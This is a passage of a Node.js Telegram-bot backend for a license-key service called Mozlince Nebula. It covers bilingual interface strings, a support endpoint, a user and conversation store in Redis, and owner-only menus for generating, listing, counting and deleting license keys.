function supportHandler(req,res){ const {chatId,message} = req.body||{}; if (!message) return res.status(400).json({ok:false,error:'missing_message'}); if (chatId && OWNER_ID) tgSend(OWNER_ID, `<b>✆ SUPORTE (API)</b>\n<code>${chatId}</code>\n\n${message}`).catch(()=>{}); res.json({ ok:true, received:true, serverTime:Date.now() }); }
app.post('/v1/support',supportHandler); app.post('/api/v1/support',supportHandler);

/* ═══ I18N (inalterado) ═══ */
const T = {
  pt: {
    menu_title:'⌬  PAINEL DE CONTROLE', menu_sub:'Selecione uma operação abaixo',
    online:'online', secure:'seguro',
    btn_generate:'⚡  Gerar Licença', btn_mykeys:'◈  Minhas Chaves', btn_stats:'◧  Estatísticas',
    btn_link:'⟡  Vincular', btn_unlink:'⌬  Desvincular', btn_query:'◉  Consultar',
    btn_prices:'✦  Tabela de Preços', btn_support:'✆  Suporte',
    btn_lang:'◐  Idioma / Language', btn_help:'?  Ajuda', btn_danger:'⚠  Zona de Perigo',
    btn_back:'‹  Voltar', btn_menu:'‹  Menu', btn_refresh:'↻  Atualizar', btn_cancel:'✕  Cancelar',
    btn_confirm_yes:'✓  Sim, confirmar', btn_confirm_no:'✕  Cancelar',
    welcome_title:'Bem-vindo ao Mozlince Nebula',
    welcome_desc:'Para adquirir uma licença premium, clique abaixo:',
    contact:'✆  CONTACTAR SUPORTE',
    support_title:'✆  Suporte', support_write:'Escreva sua mensagem agora:',
    support_hint:'(o próximo texto será encaminhado ao suporte)',
    support_exp:'Sessão expira em 10 minutos',
    support_sent:'✓  MENSAGEM ENVIADA',
    support_sent_desc:'Sua mensagem foi encaminhada.\nTempo de resposta: até 24h',
    support_cancelled:'✕  Suporte cancelado',
    gen_title:'⚡  Gerar Licença', gen_sub:'Escolha um plano abaixo:',
    gen_success:'✓  LICENÇA EMITIDA', gen_key:'Chave', gen_plan:'Plano', gen_price:'Preço',
    gen_issued:'Emitida', gen_expires:'Expira', gen_duration:'Duração',
    gen_lifetime:'Lifetime', gen_never:'Nunca', gen_yes:'Sim', gen_no:'Não',
    list_title:'◈  Minhas Licenças', list_empty:'Nenhuma licença cadastrada.', list_more:'+{n} ocultas',
    stats_title:'◧  Estatísticas', stats_total:'Total', stats_active:'Ativas',
    stats_expired:'Expiradas', stats_linked:'Vinculadas', stats_lifetime:'Lifetime',
    stats_revenue:'Receita', stats_rate:'Taxa ativa',
    detail_title:'◉  Detalhes da Licença', detail_key:'Chave', detail_status:'Status',
    detail_active:'● Ativa', detail_revoked:'○ Revogada', detail_install:'Install ID',
    detail_not_linked:'não vinculada', detail_remaining:'Restante',
    act_link:'⟡ Vincular', act_unlink:'⌬ Desvincular', act_revoke:'✕ Revogar', act_delete:'✕ Deletar',
    prices_title:'✦  Tabela de Preços', prices_currency:'USD (Dólar Americano)',
    help_title:'?  Central de Ajuda', help_cmds:'Comandos disponíveis',
    danger_title:'⚠  Zona de Perigo', danger_warn:'Ações irreversíveis',
    danger_del_active:'Deletar apenas ativas', danger_del_all:'Deletar TODAS as licenças',
    danger_confirm_active:'Deletar todas as licenças <b>ativas</b>?',
    danger_confirm_all:'⚠ DELETAR TODAS as licenças? Esta ação é irreversível.',
    danger_done:'{n} licenças removidas.',
    lang_select:'Escolha seu idioma / Choose your language:', lang_saved:'✓ Idioma atualizado',
    status_active:'● Ativa', status_revoked:'○ Revogada', status_expired:'✕ Expirada',
    expired_msg:'Esta licença expirou. Renove para continuar.',
    btn_dm:'✉  Enviar Mensagem', btn_convs:'💬  Conversas',
    dm_title:'✉  ENVIAR MENSAGEM', dm_sub:'Escolha um usuário ou digite /dm @user msg',
    dm_users_title:'◈  USUÁRIOS CONHECIDOS', dm_users_empty:'Nenhum usuário registrado ainda.',
    dm_sent:'✓  Mensagem enviada', dm_not_found:'✕  Usuário não encontrado',
    conv_title:'💬  CONVERSA', conv_empty:'Sem histórico com este usuário.', conv_cleared:'✓  Histórico limpo',
    inbox_title:'📥  NOVA MENSAGEM RECEBIDA',
    inbox_reply_hint:'Responda com: /resp &lt;chatId&gt; &lt;msg&gt;',
    dm_type_msg:'✎  Envie agora a mensagem para',
    dm_next_is_msg:'(o próximo texto será enviado)',
    users_hint:'Use /dm &lt;@user|chatId&gt; &lt;msg&gt;'
  },
  en: {
    menu_title:'⌬  CONTROL PANEL', menu_sub:'Select an operation below',
    online:'online', secure:'secure',
    btn_generate:'⚡  Generate License', btn_mykeys:'◈  My Keys', btn_stats:'◧  Statistics',
    btn_link:'⟡  Link', btn_unlink:'⌬  Unlink', btn_query:'◉  Query',
    btn_prices:'✦  Price List', btn_support:'✆  Support',
    btn_lang:'◐  Language / Idioma', btn_help:'?  Help', btn_danger:'⚠  Danger Zone',
    btn_back:'‹  Back', btn_menu:'‹  Menu', btn_refresh:'↻  Refresh', btn_cancel:'✕  Cancel',
    btn_confirm_yes:'✓  Yes, confirm', btn_confirm_no:'✕  Cancel',
    welcome_title:'Welcome to Mozlince Nebula',
    welcome_desc:'To purchase a premium license, click below:',
    contact:'✆  CONTACT SUPPORT',
    support_title:'✆  Support', support_write:'Write your message now:',
    support_hint:'(the next text will be forwarded to support)',
    support_exp:'Session expires in 10 minutes',
    support_sent:'✓  MESSAGE SENT',
    support_sent_desc:'Your message was forwarded.\nResponse time: up to 24h',
    support_cancelled:'✕  Support cancelled',
    gen_title:'⚡  Generate License', gen_sub:'Choose a plan below:',
    gen_success:'✓  LICENSE ISSUED', gen_key:'Key', gen_plan:'Plan', gen_price:'Price',
    gen_issued:'Issued', gen_expires:'Expires', gen_duration:'Duration',
    gen_lifetime:'Lifetime', gen_never:'Never', gen_yes:'Yes', gen_no:'No',
    list_title:'◈  My Licenses', list_empty:'No licenses found.', list_more:'+{n} hidden',
    stats_title:'◧  Statistics', stats_total:'Total', stats_active:'Active',
    stats_expired:'Expired', stats_linked:'Linked', stats_lifetime:'Lifetime',
    stats_revenue:'Revenue', stats_rate:'Active rate',
    detail_title:'◉  License Details', detail_key:'Key', detail_status:'Status',
    detail_active:'● Active', detail_revoked:'○ Revoked', detail_install:'Install ID',
    detail_not_linked:'not linked', detail_remaining:'Remaining',
    act_link:'⟡ Link', act_unlink:'⌬ Unlink', act_revoke:'✕ Revoke', act_delete:'✕ Delete',
    prices_title:'✦  Price List', prices_currency:'USD (US Dollar)',
    help_title:'?  Help Center', help_cmds:'Available commands',
    danger_title:'⚠  Danger Zone', danger_warn:'Irreversible actions',
    danger_del_active:'Delete active only', danger_del_all:'Delete ALL licenses',
    danger_confirm_active:'Delete all <b>active</b> licenses?',
    danger_confirm_all:'⚠ DELETE ALL licenses? This action is irreversible.',
    danger_done:'{n} licenses removed.',
    lang_select:'Choose your language / Escolha seu idioma:', lang_saved:'✓ Language updated',
    status_active:'● Active', status_revoked:'○ Revoked', status_expired:'✕ Expired',
    expired_msg:'This license expired. Renew to continue.',
    btn_dm:'✉  Send Message', btn_convs:'💬  Conversations',
    dm_title:'✉  SEND MESSAGE', dm_sub:'Pick a user or type /dm @user msg',
    dm_users_title:'◈  KNOWN USERS', dm_users_empty:'No users registered yet.',
    dm_sent:'✓  Message sent', dm_not_found:'✕  User not found',
    conv_title:'💬  CONVERSATION', conv_empty:'No history with this user.', conv_cleared:'✓  History cleared',
    inbox_title:'📥  NEW MESSAGE RECEIVED',
    inbox_reply_hint:'Reply with: /resp &lt;chatId&gt; &lt;msg&gt;',
    dm_type_msg:'✎  Send the message now to',
    dm_next_is_msg:'(the next text will be sent)',
    users_hint:'Use /dm &lt;@user|chatId&gt; &lt;msg&gt;'
  }
};
function t(lang, key, vars={}) { let s = (T[lang] || T.pt)[key] || T.pt[key] || key; for (const k in vars) s = s.replace(`{${k}}`, vars[k]); return s; }

/* ═══ TELEGRAM ═══ */
const SUPPORT_SESSIONS = new Map();
const DM_SESSIONS = new Map();
const USER_LANG = new Map();
const seenUpdates = new Map();
const sessionsInterval = setInterval(() => {
  const now = Date.now();
  for (const [k,v] of SUPPORT_SESSIONS.entries()) if (now - v.ts > 10*60*1000) SUPPORT_SESSIONS.delete(k);
  for (const [k,v] of DM_SESSIONS.entries()) if (now - v.ts > 10*60*1000) DM_SESSIONS.delete(k);
  for (const [k,v] of seenUpdates.entries()) if (now - v > 60*60*1000) seenUpdates.delete(k);
}, 60000);
if (sessionsInterval.unref) sessionsInterval.unref();
const TG_API = TELEGRAM_TOKEN ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}` : null;
async function tgSend(chatId, text, keyboard=null) {
  if (!TG_API) return false;
  try { const body={chat_id:chatId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; const r = await fetch(`${TG_API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); const d = await r.json(); return d.ok === true; } catch(e){ log('TG','send erro: '+e.message); return false; }
}
async function tgEdit(chatId, messageId, text, keyboard=null) {
  if (!TG_API) return;
  try { const body={chat_id:chatId,message_id:messageId,text,parse_mode:'HTML',disable_web_page_preview:true}; if(keyboard)body.reply_markup=keyboard; await fetch(`${TG_API}/editMessageText`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}); } catch(e){ log('TG','edit erro: '+e.message); }
}
async function tgAnswer(id, text='') { if (!TG_API) return; try { await fetch(`${TG_API}/answerCallbackQuery`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({callback_query_id:id,text})}); } catch {} }

const USER_DB_KEY = 'ASHEO-USER-REGISTRY';
const CONV_PREFIX = 'ASHEO-CONV-';
async function registrarUsuario(from, chatId) {
  try {
    const reg = (await redisGetRaw(USER_DB_KEY)) || {};
    const id = String(chatId);
    reg[id] = { chatId: id, nome: `${from.first_name||''} ${from.last_name||''}`.trim() || 'Sem nome', username: from.username ? '@'+from.username : null, lang: USER_LANG.get(id) || 'pt', lastSeen: Date.now() };
    await redisSet(USER_DB_KEY, reg);
  } catch (e) { log('DBG', 'registrarUsuario: ' + e.message); }
}
async function buscarUsuario(termo) {
  const reg = (await redisGetRaw(USER_DB_KEY).catch(()=>null)) || {};
  const raw = String(termo || '').trim();
  if (!raw) return null;
  if (reg[raw]) return reg[raw];
  const tt = raw.toLowerCase().replace(/^@/, '');
  for (const id in reg) {
    const u = reg[id];
    if (u.username && u.username.toLowerCase().replace('@','') === tt) return u;
    if (u.nome && u.nome.toLowerCase() === tt) return u;
  }
  return null;
}
async function listarUsuarios() { const reg = (await redisGetRaw(USER_DB_KEY).catch(()=>null)) || {}; return Object.values(reg).sort((a,b) => (b.lastSeen||0) - (a.lastSeen||0)); }
async function salvarConversa(chatId, direcao, texto) {
  try {
    const k = CONV_PREFIX + String(chatId);
    const arr = (await redisGetRaw(k).catch(()=>null)) || [];
    arr.push({ dir: direcao, txt: texto, ts: Date.now() });
    if (arr.length > 200) arr.splice(0, arr.length - 200);
    await redisSet(k, arr);
  } catch (e) { log('DBG','salvarConversa: '+e.message); }
}
async function lerConversa(chatId) { try { return (await redisGetRaw(CONV_PREFIX + String(chatId)).catch(()=>null)) || []; } catch { return []; } }
async function limparConversa(chatId) { await redisDel(CONV_PREFIX + String(chatId)).catch(()=>{}); }

const UI = {
  header: (lang='pt') => {
    const subtitle = lang === 'en' ? 'Premium License Engine' : 'Motor de Licenças Premium';
    return `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.5.1</b>\n<i>${subtitle} · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>`;
  },
  sep: '╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌',
  kv: (icon, label, value) => `<b>${icon}</b>  <b>${label}:</b>  ${value}`
};

function menuPrincipal(lang='pt') {
  const hora = new Date().toLocaleString('pt-BR', { timeZone:'America/Sao_Paulo', hour:'2-digit', minute:'2-digit' });
  return {
    texto: `${UI.header(lang)}\n\n<b>${t(lang,'menu_title')}</b>\n<code>${UI.sep}</code>\n<b>◔</b> ${hora}   <b>◉</b> ${t(lang,'online')}   <b>⟡</b> ${t(lang,'secure')} ES256\n<code>${UI.sep}</code>\n\n<i>${t(lang,'menu_sub')}</i>`,
    teclado: { inline_keyboard: [
      [{ text: t(lang,'btn_generate'), callback_data:'m_gerar' }],
      [{ text: t(lang,'btn_mykeys'), callback_data:'m_listar' }, { text: t(lang,'btn_stats'), callback_data:'m_stats' }],
      [{ text: t(lang,'btn_link'), callback_data:'m_vincular' }, { text: t(lang,'btn_unlink'), callback_data:'m_desvincular' }],
      [{ text: t(lang,'btn_query'), callback_data:'m_consultar' }],
      [{ text: t(lang,'btn_prices'), callback_data:'m_precos' }],
      [{ text: t(lang,'btn_dm'), callback_data:'m_dm' }, { text: t(lang,'btn_convs'), callback_data:'m_convs' }],
      [{ text: t(lang,'btn_support'), callback_data:'m_contacto' }],
      [{ text: t(lang,'btn_lang'), callback_data:'m_lang' }],
      [{ text: t(lang,'btn_help'), callback_data:'m_ajuda' }, { text: t(lang,'btn_danger'), callback_data:'m_perigo' }]
    ]}
  };
}
async function cmdStart(chatId, msgId=null) { const lang = USER_LANG.get(String(chatId)) || 'pt'; const m = menuPrincipal(lang); if (msgId) await tgEdit(chatId, msgId, m.texto, m.teclado); else await tgSend(chatId, m.texto, m.teclado); }

async function handleCallback(cb) {
  const chatId = cb.message.chat.id, msgId = cb.message.message_id, data = cb.data, userId = String(cb.from.id);
  const isOwner = OWNER_ID && userId === String(OWNER_ID);
  const lang = USER_LANG.get(String(chatId)) || 'pt';
  if (data === 'm_lang') { await tgAnswer(cb.id); await tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◐  ${t(lang,'lang_select')}</b>\n<code>${UI.sep}</code>`, { inline_keyboard: [[{ text:'▸ Português (BR)', callback_data:'lang_pt' }, { text:'▸ English (US)', callback_data:'lang_en' }],[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); return; }
  if (data === 'lang_pt' || data === 'lang_en') { const novo = data === 'lang_pt' ? 'pt' : 'en'; USER_LANG.set(String(chatId), novo); await tgAnswer(cb.id, t(novo,'lang_saved')); const m = menuPrincipal(novo); await tgEdit(chatId, msgId, m.texto, m.teclado); return; }
  if (!isOwner) {
    if (data === 'm_contacto') { SUPPORT_SESSIONS.set(String(chatId), { step:'waiting', ts: Date.now() }); await tgAnswer(cb.id, '✎'); await tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'support_title')}</b>\n<code>${UI.sep}</code>\n\n<b>✎</b> ${t(lang,'support_write')}\n<i>${t(lang,'support_hint')}</i>\n\n<code>${UI.sep}</code>\n<b>◔</b> ${t(lang,'support_exp')}`, { inline_keyboard: [[{ text: t(lang,'btn_cancel'), callback_data:'m_cancelar_suporte' }]] }); return; }
    if (data === 'm_cancelar_suporte') { SUPPORT_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); await tgEdit(chatId, msgId, `<b>${t(lang,'support_cancelled')}</b>`, { inline_keyboard: [[{ text: t(lang,'contact'), callback_data:'m_contacto' }]] }); return; }
    if (data === 'm_home') { await tgAnswer(cb.id); await tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>◈  ${t(lang,'welcome_title')}</b>\n<code>${UI.sep}</code>\n\n<i>${t(lang,'welcome_desc')}</i>`, { inline_keyboard: [[{ text: t(lang,'contact'), callback_data:'m_contacto' }],[{ text: t(lang,'btn_lang'), callback_data:'m_lang' }]] }); return; }
    await tgAnswer(cb.id, '⛔'); return;
  }
  try {
    if (data === 'm_home') { await tgAnswer(cb.id); return cmdStart(chatId, msgId); }
    if (data === 'm_dm') {
      await tgAnswer(cb.id, '✉');
      const users = await listarUsuarios();
      if (users.length === 0) return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'dm_title')}</b>\n<code>${UI.sep}</code>\n<i>${t(lang,'dm_users_empty')}</i>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] });
      const kb = { inline_keyboard: [] };
      for (const u of users.slice(0, 20)) kb.inline_keyboard.push([{ text: '✉ ' + ((u.username || u.nome) + ' · ' + u.chatId).substring(0, 45), callback_data: `dm_${u.chatId}` }]);
      kb.inline_keyboard.push([{ text: t(lang,'btn_back'), callback_data:'m_home' }]);
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'dm_users_title')}</b>  <code>(${users.length})</code>\n<code>${UI.sep}</code>`, kb);
    }
    if (data.startsWith('dm_')) {
      const target = data.substring(3);
      await tgAnswer(cb.id, '✉');
      DM_SESSIONS.set(String(chatId), { step: 'await_msg', target, ts: Date.now() });
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'dm_title')}</b>\n<code>${UI.sep}</code>\n\n<b>✎</b>  ${t(lang,'dm_type_msg')} <code>${target}</code>\n<i>${t(lang,'dm_next_is_msg')}</i>`, { inline_keyboard: [[{ text: t(lang,'btn_cancel'), callback_data:'m_dm_cancel' }]] });
    }
    if (data === 'm_dm_cancel') { DM_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); return cmdStart(chatId, msgId); }
    if (data === 'm_convs') {
      await tgAnswer(cb.id, '💬');
      const users = await listarUsuarios();
      if (users.length === 0) return tgEdit(chatId, msgId, `<i>${t(lang,'dm_users_empty')}</i>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] });
      const kb = { inline_keyboard: [] };
      for (const u of users.slice(0, 20)) kb.inline_keyboard.push([{ text: `💬 ${u.username || u.nome}`, callback_data: `cv_${u.chatId}` }]);
      kb.inline_keyboard.push([{ text: t(lang,'btn_back'), callback_data:'m_home' }]);
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'btn_convs')}</b>\n<code>${UI.sep}</code>`, kb);
    }
    if (data.startsWith('cv_')) {
      const target = data.substring(3);
      await tgAnswer(cb.id);
      const hist = await lerConversa(target);
      let txt = `${UI.header(lang)}\n\n<b>${t(lang,'conv_title')}</b> <code>${target}</code>\n<code>${UI.sep}</code>\n\n`;
      if (hist.length === 0) txt += `<i>${t(lang,'conv_empty')}</i>`;
      else for (const m of hist.slice(-15)) { const hora = new Date(m.ts).toLocaleString('pt-BR', { timeZone:'America/Sao_Paulo', hour:'2-digit', minute:'2-digit' }); txt += `${m.dir === 'in' ? '👤' : '👑'} <i>${hora}</i>\n${String(m.txt||'').substring(0,300)}\n\n`; }
      return tgEdit(chatId, msgId, txt, { inline_keyboard: [[{ text: '✉ ' + t(lang,'btn_dm'), callback_data: `dm_${target}` }],[{ text: '🗑 Limpar', callback_data: `cvc_${target}` }],[{ text: t(lang,'btn_back'), callback_data:'m_convs' }]] });
    }
    if (data.startsWith('cvc_')) { const target = data.substring(4); await limparConversa(target); await tgAnswer(cb.id, t(lang,'conv_cleared')); return tgEdit(chatId, msgId, `✓ ${t(lang,'conv_cleared')}`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_convs' }]] }); }
    if (data === 'm_gerar') {
      await tgAnswer(cb.id, '⚡');
      const kb = { inline_keyboard: [] };
      const entries = Object.entries(PACOTES);
      for (let i = 0; i < entries.length; i += 2) {
        const linha = [{ text: `${entries[i][1].emoji} ${entries[i][1].nome} · ${precoFmt(entries[i][1].preco)}`, callback_data:`g_${entries[i][0]}` }];
        if (entries[i+1]) linha.push({ text: `${entries[i+1][1].emoji} ${entries[i+1][1].nome} · ${precoFmt(entries[i+1][1].preco)}`, callback_data:`g_${entries[i+1][0]}` });
        kb.inline_keyboard.push(linha);
      }
      kb.inline_keyboard.push([{ text: t(lang,'btn_back'), callback_data:'m_home' }]);
      let tabela = '';
      for (const [,p] of Object.entries(PACOTES)) { const dur = p.lifetime ? '∞' : `${p.dias}d`; tabela += `<b>${p.emoji}</b>  ${p.nome.padEnd(11)}  <code>${precoFmt(p.preco)}</code>  <i>${dur}</i>\n`; }
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'gen_title')}</b>\n<code>${UI.sep}</code>\n<i>${t(lang,'gen_sub')}</i>\n\n${tabela}\n<code>${UI.sep}</code>`, kb);
    }
    if (data.startsWith('g_')) {
      const pk = data.substring(2), p = PACOTES[pk];
      if (!p) { await tgAnswer(cb.id, '✕'); return; }
      const chave = generateLicenseKey();
      const agora = Date.now();
      const expira = p.lifetime ? (agora + 100*365*24*60*60*1000) : (agora + p.dias*24*60*60*1000);
      await redisSet(chave, { chave, plano: pk, planoNome: p.nome, preco: p.preco, preco_usd: p.preco, preco_fmt: precoFmt(p.preco), dias: p.dias, lifetime: p.lifetime === true, ilimitada: p.lifetime === true, criadaEm: agora, expiraEm: expira, ativa: true, installId: null, ativadaEm: null, activationCount: 0, v: 8 });
      log('OK', `Chave ${pk} gerada: ${chave}`);
      await tgAnswer(cb.id, '✓');
      const restaTxt = p.lifetime ? '∞  LIFETIME' : humanTime(p.dias*24*60*60*1000);
      const barra = p.lifetime ? '▰▰▰▰▰▰▰▰▰▰' : progressBar(100);
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'gen_success')}</b>\n<code>${UI.sep}</code>\n\n<b>⌬  ${t(lang,'gen_key')}</b>\n<code>${chave}</code>\n\n<code>${UI.sep}</code>\n${UI.kv(p.emoji, t(lang,'gen_plan'), `<b>${p.nome}</b>`)}\n${UI.kv('◆', t(lang,'gen_price'), `<code>${precoFmt(p.preco)}</code>`)}\n${UI.kv('◔', t(lang,'gen_issued'), formatDate(agora))}\n${UI.kv('◕', t(lang,'gen_expires'), p.lifetime ? `<b>${t(lang,'gen_never')}</b>` : formatDate(expira))}\n${UI.kv('⟡', t(lang,'gen_duration'), `<b>${restaTxt}</b>`)}\n${UI.kv('∞', t(lang,'gen_lifetime'), p.lifetime ? `✓ ${t(lang,'gen_yes')}` : `✕ ${t(lang,'gen_no')}`)}\n<code>${UI.sep}</code>\n<code>${barra}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_query'), callback_data:`c_${chave}` }],[{ text: t(lang,'btn_menu'), callback_data:'m_home' }]] });
    }
    if (data === 'm_listar') {
      await tgAnswer(cb.id, '◈');
      const keys = await redisScan('ASHEO-*');
      const licKeys = [];
      for (const k of keys) { if (k.startsWith('ASHEO-INSTALL-') || k.startsWith('ASHEO-USER') || k.startsWith('ASHEO-CONV-') || k.startsWith('ASHEO-CAMPAIGN')) continue; licKeys.push(k); }
      if (licKeys.length === 0) return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'list_title')}</b>\n<code>${UI.sep}</code>\n<i>${t(lang,'list_empty')}</i>`, { inline_keyboard: [[{ text: t(lang,'btn_generate'), callback_data:'m_gerar' }],[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] });
      let txt = `<b>${t(lang,'list_title')}</b>  <code>(${licKeys.length})</code>\n<code>${UI.sep}</code>\n\n`;
      const inlineKb = [];
      for (let i = 0; i < Math.min(licKeys.length, 15); i++) {
        const l = await redisGet(licKeys[i]).catch(()=>null); if (!l) continue;
        const exp = l.lifetime ? '∞' : humanTime((l.expiraEm||0) - Date.now());
        const emoji = l.lifetime ? '∞' : (l.ativa ? '●' : '○');
        txt += `<b>${emoji}</b> ${l.installId?'⟡':'○'} <code>${licKeys[i]}</code>\n   <i>${l.planoNome} · ${exp}</i>\n\n`;
        inlineKb.push([{ text:`▸ ${licKeys[i].substring(0,18)}…`, callback_data:`c_${licKeys[i]}` }]);
      }
      if (licKeys.length > 15) txt += `<i>${t(lang,'list_more',{n:licKeys.length-15})}</i>\n`;
      inlineKb.push([{ text: t(lang,'btn_refresh'), callback_data:'m_listar' }, { text: t(lang,'btn_back'), callback_data:'m_home' }]);
      return tgEdit(chatId, msgId, txt, { inline_keyboard: inlineKb });
    }
    if (data === 'm_stats') {
      await tgAnswer(cb.id, '◧');
      const keys = await redisScan('ASHEO-*');
      let ativas=0, expiradas=0, vinc=0, life=0, receita=0, total=0;
      for (const k of keys) { if (k.startsWith('ASHEO-INSTALL-') || k.startsWith('ASHEO-USER') || k.startsWith('ASHEO-CONV-') || k.startsWith('ASHEO-CAMPAIGN')) continue; const l = await redisGet(k).catch(()=>null); if (!l) continue; total++; if (l.ativa) ativas++; if (!l.lifetime && l.expiraEm < Date.now()) expiradas++; if (l.installId) vinc++; if (l.lifetime) life++; if (l.preco) receita += Number(l.preco) || 0; }
      const taxa = total ? Math.round((ativas/total)*100) : 0;
      return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'stats_title')}</b>\n<code>${UI.sep}</code>\n\n${UI.kv('◈', t(lang,'stats_total'), `<code>${total}</code>`)}\n${UI.kv('●', t(lang,'stats_active'), `<code>${ativas}</code>`)}\n${UI.kv('○', t(lang,'stats_expired'), `<code>${expiradas}</code>`)}\n${UI.kv('⟡', t(lang,'stats_linked'), `<code>${vinc}</code>`)}\n${UI.kv('∞', t(lang,'stats_lifetime'), `<code>${life}</code>`)}\n\n<code>${UI.sep}</code>\n${UI.kv('◆', t(lang,'stats_revenue'), `<code>${precoFmt(receita)}</code>`)}\n${UI.kv('◔', t(lang,'stats_rate'), `<b>${taxa}%</b>`)}\n<code>${progressBar(taxa, 15)}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_refresh'), callback_data:'m_stats' }, { text: t(lang,'btn_back'), callback_data:'m_home' }]] });
    }
    if (data === 'm_vincular') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'act_link')}</b>\n<code>${UI.sep}</code>\n<code>/activate &lt;installId&gt; &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_desvincular') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'act_unlink')}</b>\n<code>${UI.sep}</code>\n<code>/desvincular &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_consultar') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'btn_query')}</b>\n<code>${UI.sep}</code>\n<code>/status &lt;chave&gt;</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_precos') {
      await tgAnswer(cb.id);
      let txt = `${UI.header(lang)}\n\n<b>${t(lang,'prices_title')}</b>\n<code>${UI.sep}</code>\n\n`;
      for (const [,p] of Object.entries(PACOTES)) { const dur = p.lifetime ? '∞' : `${p.dias} dias`; txt += `<b>${p.emoji}</b>  ${p.nome.padEnd(11)}  <code>${precoFmt(p.preco)}</code>\n      <i>${dur}</i>\n`; }
      txt += `\n<code>${UI.sep}</code>\n<i>◆ ${t(lang,'prices_currency')}</i>`;
      return tgEdit(chatId, msgId, txt, { inline_keyboard: [[{ text: t(lang,'btn_support'), callback_data:'m_contacto' }],[{ text: t(lang,'btn_generate'), callback_data:'m_gerar' }, { text: t(lang,'btn_back'), callback_data:'m_home' }]] });
    }
    if (data === 'm_contacto') { await tgAnswer(cb.id, '✆'); SUPPORT_SESSIONS.set(String(chatId), { step:'waiting', ts: Date.now() }); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'support_title')}</b>\n<code>${UI.sep}</code>\n\n<b>✎</b> ${t(lang,'support_write')}\n<i>${t(lang,'support_hint')}</i>\n\n<code>${UI.sep}</code>\n<b>◔</b> ${t(lang,'support_exp')}`, { inline_keyboard: [[{ text: t(lang,'btn_cancel'), callback_data:'m_cancelar_suporte' }]] }); }
    if (data === 'm_cancelar_suporte') { SUPPORT_SESSIONS.delete(String(chatId)); await tgAnswer(cb.id, '✕'); return cmdStart(chatId, msgId); }
    if (data === 'm_ajuda') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'help_title')}</b>\n<code>${UI.sep}</code>\n\n<code>/start /gerar /listar /stats /status /activate /desvincular /revogar /deletar /deletartudo /usuarios /dm /conversa /resp /lang</code>\n\n<code>${UI.sep}</code>`, { inline_keyboard: [[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'm_perigo') { await tgAnswer(cb.id, '⚠'); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>${t(lang,'danger_title')}</b>\n<code>${UI.sep}</code>\n<b>⚠  ${t(lang,'danger_warn')}</b>`, { inline_keyboard: [[{ text: t(lang,'danger_del_active'), callback_data:'danger_ativas' }],[{ text: t(lang,'danger_del_all'), callback_data:'danger_tudo' }],[{ text: t(lang,'btn_back'), callback_data:'m_home' }]] }); }
    if (data === 'danger_ativas') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>⚠  CONFIRMAR</b>\n<code>${UI.sep}</code>\n${t(lang,'danger_confirm_active')}`, { inline_keyboard: [[{ text: t(lang,'btn_confirm_yes'), callback_data:'confirm_ativas' }],[{ text: t(lang,'btn_confirm_no'), callback_data:'m_perigo' }]] }); }
    if (data === 'danger_tudo') { await tgAnswer(cb.id); return tgEdit(chatId, msgId, `${UI.header(lang)}\n\n<b>💣  CONFIRMAR</b>\n<code>${UI.sep}</code>\n${t(lang,'danger_confirm_all')}`, { inline_keyboard: [[{ text: t(lang,'btn_confirm_yes'), callback_data:'confirm_tudo' }],[{ text: t(lang,'btn_confirm_no'), callback_data:'m_perigo' }]] }); }
